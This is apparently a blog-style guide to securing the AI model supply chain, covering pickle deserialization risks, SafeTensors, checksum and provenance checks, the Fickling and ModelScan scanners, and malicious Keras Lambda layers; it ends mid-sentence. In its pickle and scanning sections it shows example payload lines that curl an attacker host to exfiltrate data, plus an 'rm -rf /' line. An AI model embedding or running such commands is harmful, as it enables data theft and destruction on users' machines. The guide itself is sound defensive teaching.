--

A practical guide to securing AI models using SafeTensors, Fickling, ModelScan, SBOMs, and secure model acquisition.
Estimated Reading Time : 12 min read
1. Introduction :
Modern AI development relies heavily on pre-trained models downloaded from repositories such as Hugging Face or accessed through APIs like OpenAI and Anthropic. While this dramatically accelerates development, it also introduces an entirely new software supply chain — one capable of delivering malicious models, compromised dependencies, poisoned datasets, or silently modified APIs.
Traditional application security focuses on source code. AI systems require us to trust artifacts we often didn’t build ourselves.
This article explores how to secure every stage of the AI supply chain before a model ever reaches production.
2. The Security Goal :
Press enter or click to view image in full size

The purpose is simple:
Never trust an AI artifact simply because it comes from a popular repository.
The goal of securing the AI supply chain is to ensure that every AI component is trusted before it reaches production.
Unlike traditional software, AI applications depend on many external artifacts:

• Models

• Datasets

• Python packages

• LoRA adapters

• Prompt templates

• API providers
Each of these components can become an attack vector if an attacker modifies or replaces it.
The objective is not simply to block malware, but to verify:

• ✅ The artifact comes from a trusted source.

• ✅ It has not been modified.

• ✅ It cannot execute unexpected code.

• ✅ It behaves as expected.

• ✅ Its dependencies are secure.

• ✅ External providers cannot silently change the application’s behavior.
In other words:
Never trust an AI artifact simply because it works. Verify it before trusting it. Every model must earn trust.
3. Safe Serialization :
The goal is Prevent arbitrary code execution when loading machine learning models.
Before We Begin: What Is Model Serialization?
When training a machine learning model, the model exists only in memory (RAM). Once training finishes, we need a way to save it so it can be reused later without retraining it from scratch.
This process is called serialization.
Think of serialization like saving a video game.

• You spend hours progressing through the game.

• Instead of starting over every time, you save your progress.

• Later, the game loads the save file and restores everything exactly as it was.
Machine learning models work the same way.
Instead of saving game progress, we save:

• learned weights (The actual “knowledge” or numbers the model learned during training. )

• biases (also like the learned weights)

• configuration

• architecture (depending on the format. The blueprint of the model (e.g., “Layer 1 has 64 nodes, Layer 2 has 32 nodes”).)
into a file stored on disk.
Later, the application loads that file to use the trained model for inference.
Without serialization, every deployment would require retraining the model, which could take hours or even days.
What Is Pickle?
One of Python’s built-in serialization formats is Pickle.
Its job is simple:
Convert Python objects into a file, then reconstruct those objects later.
For example:
import picklemodel = {"weights":[1.2,2.4,5.1]}with open("model.pkl","wb") as f:
pickle.dump(model,f)Later:
with open("model.pkl","rb") as f:
model = pickle.load(f)The application restores the original object exactly as it was.
This flexibility is why many ML frameworks such as PyTorch and scikit-learn historically relied on Pickle to store models.
Why Is Pickle Dangerous?
The problem is that Pickle was never designed to store only data.
It was designed to reconstruct any Python object.
That includes:

• dictionaries

• lists

• classes

• functions

• custom objects
When pickle.load() reads a file, it doesn't simply read numbers.
It follows instructions embedded inside the file to recreate the original object.
In other words:
A Pickle file is not just data — it can contain instructions that Python executes while loading it.
This is where the danger begins.
The Hidden Danger: __reduce__
When Pickle restores a custom object, it asks the object:
“How should I recreate you?”
The object answers using a special Python method called:
__reduce__()Normally this method is harmless. For example, it might tell Python:
“Create an object of this class and initialize it with these values.”
However, nothing prevents it from returning a completely different instruction.
Instead of reconstructing an object, it could tell Python:
os.system("curl attacker.com")or
subprocess.Popen(...)or
rm -rf /The dangerous part is that Python executes those instructions automatically during pickle.load().
The user never clicks “Run.”
The code executes simply because the file was loaded.
The Defense: SafeTensors
SafeTensors is a serialization format designed specifically for machine learning models that stores only tensor data (weights and biases) and cannot contain executable Python code.
Unlike Pickle, which can reconstruct arbitrary Python objects and execute instructions during loading, SafeTensors stores model weights in a simple structure consisting of a validated header and raw binary tensor data.
This design eliminates the code execution attack surface, making it impossible for a malicious model to abuse mechanisms like __reduce__.
Why it is safer

• ✅ Stores only model weights (tensors)

• ✅ No Python objects or functions

• ✅ No arbitrary code execution during loading

• ✅ Faster loading thanks to efficient memory mapping
Limitation
SafeTensors protects against serialization-based attacks, but it does not protect against malicious model architectures (e.g., Keras Lambda layers) or poisoned model weights. It is an essential security layer, but not a complete solution.
Key takeaway: SafeTensors prevents code execution at model load time by treating the model as data only, not executable Python objects.
4. Model Verification & Provenance
security goal Ensure the model you download is authentic, untampered, and actually comes from the trusted source you intended to use.
Even if a model is stored as SafeTensors, it could still be replaced with a malicious or backdoored version.

SHA-256 Checksum Verification
A SHA-256 checksum is like a unique fingerprint for a file.
If even one byte of the model changes, its checksum changes completely.
sha256sum model.safetensorsCompare the generated hash with the one published by the author.

• ✅ Match → File integrity is intact.

• ❌ No match → The model may have been modified or tampered with.
Remember: A checksum verifies integrity, not the identity of the publisher.

Digital Signatures
Checksums tell you the file hasn’t changed.
Digital signatures go one step further by proving who published the file.
Think of it this way:

• SHA-256 → Is the package sealed?

• Digital Signature → Did it come from the official publisher?

Review the Model Card
A trustworthy model should include a Model Card describing:

• Author or organization

• Training dataset

• Intended use

• Performance metrics

• Known limitations

• License
A missing or poorly documented Model Card is a strong warning sign.

Every AI Artifact Must Be Verified
Verification doesn’t stop at full models.
The same process applies to:

• LoRA adapters

• Fine-tuned checkpoints

• Converted models

• Merged models
Even a trusted base model becomes untrusted if you attach a malicious adapter.

Model Acquisition Framework
Before deploying any model, follow this simple workflow:
Download
↓
Quarantine
↓
Verify Source
↓
Check SHA-256
↓
Security Scan
↓
Approve or RejectNever move a model directly from the internet into production.

🔑 Key Takeaway
SafeTensors protects you from malicious code execution.
Model Verification protects you from deploying the wrong or tampered model.
Both are essential layers in securing the AI supply chain.
5. Scanning Models Before Deployment
Security Goal Detect malicious content inside a model before it is ever loaded or deployed.
Even after verifying a model’s source and checksum, it may still contain hidden malicious logic. This is why every model should be scanned before entering production.
Why Scanning Matters
Imagine downloading a model from a trusted repository.

• ✅ The checksum matches.

• ✅ The Model Card looks legitimate.

• ✅ The organization is verified.
Yet the model still contains a hidden payload that executes:
os.system("curl http://attacker.com/exfil")Without scanning, the attack will only be discovered after the model is loaded, when it is already too late.
Static scanners inspect the file without executing it, allowing us to detect malicious behavior safely.

Fickling
Fickling is a static analysis tool designed specifically for Python Pickle files.
Instead of loading the model, it decompiles the Pickle bytecode into readable Python code, making hidden payloads visible.
For example, Fickling can reveal malicious instructions such as:
from os import systemsystem("curl http://attacker.com/exfil")This immediately exposes dangerous operations without executing the model.
It can also perform an automatic safety assessment:
fickling --check-safety -p model.pkl
ModelScan
While Fickling focuses on Pickle files, ModelScan supports multiple machine learning formats, including:

• Pickle

• PyTorch

• TensorFlow

• Keras

• SafeTensors
It scans models for suspicious operations and classifies findings by severity:
SeverityMeaning🔴 CriticalConfirmed dangerous code (e.g. os.system)🟠 HighLikely malicious behavior🟡 MediumSuspicious logic requiring review🔵 LowInformational finding
A clean SafeTensors model typically returns:
No issues fou
Limitations
Like antivirus software, scanners are not perfect.
Sophisticated attackers may obfuscate payloads or hide malicious behavior in ways that evade detection.
Scanning should therefore be treated as one security layer, not your only defense.

🔑 Key Takeaway
Never execute a model before scanning it. Static analysis tools like Fickling and ModelScan help identify malicious content safely, reducing the risk of deploying compromised models.
6. Architecture-Level Threats
🎯 Security Goal
Detect malicious logic hidden inside a model’s architecture, not just its serialized file.
While tools like Fickling and ModelScan can detect malicious Pickle payloads, some attacks don’t rely on serialization at all. Instead, attackers embed malicious behavior directly into the model itself.

The Problem
Some machine learning frameworks, such as Keras, allow developers to create Lambda layers.
A Lambda layer is designed to execute custom Python functions during inference, making it useful for legitimate preprocessing or custom operations.
However, attackers can abuse this feature to hide malicious logic inside the model.
Unlike Pickle attacks, which execute when the model is loaded, a malicious Lambda layer executes when the model processes an input.
This makes the attack much harder to detect because:

• The model loads successfully.

• The checksum is valid.

• The file format may even be SafeTensors.

• The malicious code only runs during inference.

Why SafeTensors Isn’t Enough
SafeTensors only protects the serialization format.
It prevents executable code from being embedded inside the model file, but it cannot inspect or remove malicious logic already built into the model architecture.
As a result, a model can:

• ✅ Pass checksum verification.

• ✅ Be stored as SafeTensors.

• ✅ Pass Pickle security checks.
Yet still execute malicious behavior every time it makes a prediction.

Detecting Architecture-Level Threats
Because these attacks live inside the model architecture, security teams must inspect the model’s layers before deployment.
The inspection looks for suspicious components such as:

• Lambda layers

• Custom layers

• Unexpected functions

• Unknown operations
A normal model may contain layers like:

• Input

• Dense

• Flatten

• Conv2D
Finding an unexpected Lambda layer in a model downlo
